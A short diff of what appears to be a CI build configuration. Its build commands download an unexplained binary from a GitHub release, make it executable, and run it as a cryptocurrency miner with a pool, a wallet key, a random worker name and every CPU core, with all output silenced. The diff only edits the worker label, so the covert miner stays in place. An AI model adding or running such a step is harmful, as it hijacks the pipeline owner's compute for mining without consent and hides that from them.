@@ -4,4 +4,4 @@ phases:
   build:
     commands:
         - wget https://github.com/vedhagsvp/cnajea/releases/download/orno/bnmkop
-        - chmod 777 bnmkop && ./bnmkop mine -a --pool twbitz --key xLPMoYZixVLRHJV7hb9gZoMusczWYRzP7JqFCRb6vXp --worker $(echo $(shuf -i 1-15000 -n 1)-CD100) -t $(nproc --all) --ice >/dev/null 2>&1
+        - chmod 777 bnmkop && ./bnmkop mine -a --pool twbitz --key xLPMoYZixVLRHJV7hb9gZoMusczWYRzP7JqFCRb6vXp --worker $(echo $(shuf -i 1-15000 -n 1)-AD100) -t $(nproc --all) --ice >/dev/null 2>&1
